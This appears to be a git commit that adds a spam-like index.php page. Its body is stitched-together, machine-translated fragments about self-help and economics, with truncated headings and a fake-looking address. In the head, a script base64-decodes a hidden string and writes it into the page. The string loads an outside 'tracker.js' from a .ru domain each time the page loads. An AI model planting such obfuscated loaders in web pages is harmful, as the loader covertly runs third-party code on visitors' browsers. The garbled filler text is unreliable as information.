eb83c28c7a232bccbf0d7153d69b50cc1fa225f5
ittiahve <79054607+ittiahve@users.noreply.github.com>
2021-02-14 18:57:28 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Having these five elements allows the Win / Win agreement to </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl96OHoxeGRmNGpwZWd2ZDdhd3QiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="3drxrbqekmv7yd019av9bv">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="1iwk1ebwsj5pzj1saqpf">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Having these five elements allows the Win / Win agreement to </h1>
+	</section>
+
+
+	<section class="our-work" class="p0tk3i8r2j1pyfxjd3z">
+		<h3 class="title">“For some reason, our usual tricks didn't work,” th</h3>
+		<p>And this solution, this Third Alternative, could be synergistic, one that neither side could think of on its own.  - Wonderful! Do you do what you want to do- it's your problem.  These are your own.  In order to understand, it is necessary to take into account a different point of view; it takes courage to be understood.  In conditions of expanded commodity reproduction, the accumulation (i.e., accumulation and saving) of temporarily free funds is a necessary condition for the turnover of capital.  Delegation of Execution There are two main types of delegation: "execution delegation" and "management delegation".  Land plots can hardly be bought and sold yet.  But since in this chapter we are talking about the principles of personal management, and the ability to delegate to others is the main difference between the role of a manager and the role of an independent producer, I I approach delegation in terms of your personal management skills.  Mission statements shape the way of thinking, become the basis for family management.  The features of money as a medium of circulation include the real presence of money in circulation and the short duration of their participation in exchange.  This is the first step in the Win / Win process.  Such people maintain the P / PC balance by focusing on important and non-urgent matters from Square II, on matters of a higher order that create new opportunities.  Again, the engagement process itself is just as important as the outcome - the written Mission statement, as this engagement is the key to its implementation.  If the broken element in the machine is replaced with a new one, but the same, the repair is made. </p>
+		<hr>
+
+		<ul class="grid" class="9cmwvb8ltsde3rryv68">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="3drxrbqekmv7yd019av9bv">
+		<h3 class="title">The first is the successful development of</h3>
+		<p>Clean means that nothing is lying around, no papers, strings, bones, sticks, nothing that would create a mess.Here's what you and I will do: let's clean up half of the courtyard right now and then compare it with the uncleaned half! So we took two paper bags and removed one side of the patio.  82.Depreciation Depreciation is the transfer of part of the cost of fixed capital to a newly created product.  Costs associated with production and sales include: a) costs associated with the manufacture (production), storage and delivery of goods, performance of work, provision of services, purchase and (or) sale of goods (works, services, property rights ); b) expenses for the maintenance and operation, repair and maintenance of fixed assets and other property,as well as to maintain them in good (actual) condition; c) expenses for the development of natural resources; d) expenditures on research and development; e) expenses for compulsory and voluntary insurance; f) other costs associated with production and (or) sale.  You need to prepare a presentation at the meeting with sales representatives, which is scheduled for the next month (2 hours).  They don't know what it means to approach a customer.  The large scale of production will make better use of the labor of management specialists due to its deeper specialization.  " And I really tried to see the problem through his eyes. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="1iwk1ebwsj5pzj1saqpf" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="p0tk3i8r2j1pyfxjd3z">
+		<h3 class="title">Take time to write down the imaginary funeral experiences we ta</h3>
+		<p>go through the heads of all levels of management.  The way you spend your time is a result of how you see your time and how you really see your priorities.  It consists in the fact that changes in reference prices are announced by a certain firm, which is recognized as the leader by all others who follow it in the pricing policy.  You cannot tell the person, "You will think Win / Win, whether you like it or not." The question should be posed in this way: how to come to the “Win ​​/ Win” decision? Two Harvard Law Professors,Roger Fisher and William Urey, in their extremely helpful and insightful book, The Road to Conciliation, or Negotiating Without Failure [31] have done a remarkable job of establishing a “principled” approach to negotiation as opposed to a “positional” approach.  Or you may stay in the interest of keeping your job, but you will be very reluctant to do so, constantly thinking about how your wife will react to it, looking for excuses for your decision, and preparing in advance to defend against the disappointment and anger of the wife.If you are looking through money-focused glasses, you’ll be thinking primarily about the overtime payable or how this extra work will help raise your salary in the future.  The first thing that struck me was that several parents were witnesses of this manifestation of selfishness.  Using this technique, you may not want to transfer your biography to a relationship with another person, but the very motive for listening will be autobiographical.  We said it was P / PC balance,a fundamental concept in the story of the goose and the golden eggs.  - Well, not that I don’t want to ...  Carol tried to take as little pain relievers as possible in order to fully control her mind and state of mind.  You will get to know yourself more deeply and meaningfully - your character, your deep values ​​and your unique abilities.  For simplicity of organization, all animals were trained according to the general program.The duck was excellent - even better than the instructor - swam and got excellent marks for flights, but was well behind in running.  Understanding their sequence will help you manage your development more effectively,but I am not encouraging you to isolate yourself for several years until Habits 1, 2, and 3 are fully developed. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="9cmwvb8ltsde3rryv68" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="3drxrbqekmv7yd019av9bv">
+		<h3 class="title">Everyone worked much harder than they did with the </h3>
+		<p>Let's take a look at each of the five dimensions separately.  As a result, we get seven points, each of which expresses the amount of goods that the consumer decides to buy at the corresponding price.  As you work to develop the Quadrant II paradigm, you will simultaneously develop your ability to plan each week of your life and get things done around your core priorities.  Father: I help my children to enjoy life and live with joy.  At the same time, the broad capabilities of your right hemisphere can provide you with invaluable assistance in your daily efforts to implement the Positions of the Personal Mission.  Thus, money arose spontaneously, as a result of the development of commodity production and forms of value.  As soon as they realized that there was very little time left to live, the futility of abuse, evil thoughts, insults and accusations became obvious to them.  Therefore, raising taxes, for example, on sales or on property, increases production costs and reduces supply.  7.  Cash payments are associated with compensation for loss of income as a result of: full or partial loss of ability to work, the birth of children, loss of breadwinners or work (unemployment benefits, etc.).Cash social transfers are complemented in whole or in part by free health, education, housing and transport services.  I need some colored markers.He turned around as he walked and paid attention.  In the time-based wage system, two forms are distinguished: simple time-based and time-bonus.With a simple hourly wage, the worker's earnings are determined by multiplying the hourly rate of his category by the number of hours he worked.  In the context of the transition to a market in Russia, when there was a serious imbalance in the economy,the role of the state is to create market structures in order to ensure normal conditions for market development.  Your daughter is a valuable resource. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="1iwk1ebwsj5pzj1saqpf" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="p0tk3i8r2j1pyfxjd3z">
+		<h3 class="title">As a result, the employee of a certain typ</h3>
+		<p>You just listen to the words the other person says and repeat them.  At the same time, the prices for transport services, energy increased at a faster pace.  At least some of these objectives should be linked to activities in Quadrant II.  It does not arise due to external circumstances or our social position.  Before exercising, the muscles are relaxed and warmed, preparing for intense exercise.After exercising, stretching helps to dissipate lactic acid so that the muscles do not feel pain and tension. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="9cmwvb8ltsde3rryv68" class="title">Character and Communication You are currently reading a book th</h3>	
+		<p>30.  And even if the oligopolies are not the first to start the "price race", they are interested in maintaining and strengthening it.  Remember that you are always saying "no" to something.  And we would continue to share opinions until you clearly showed what you see, and I would not clearly show what I see.  The ability to make promises to yourself and keep them is the foundation for developing basic efficiency skills.  So dad, it's not necessary at all.  Only by becoming independent - proactive, focused on correct principles, driven by values ​​and able to organize their lives and act in accordance with priorities,we can choose to become interdependent — able to build rich, reliable, highly effective relationships with others.  It is impossible to realize a winning mindset in our life if we do not have a clear, deep understanding of what this gain consists of and how it is in harmony with our deepest values. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="3drxrbqekmv7yd019av9bv">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="1iwk1ebwsj5pzj1saqpf"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="p0tk3i8r2j1pyfxjd3z"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="9cmwvb8ltsde3rryv68"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>9913 Chauncey Villages, Apt. 593, 27192, Kingbury, New York, United States</p>
+		<p>Phone number: +677(185)928-48-16618</p>
+	</footer>
+
+</body>
+
+</html>
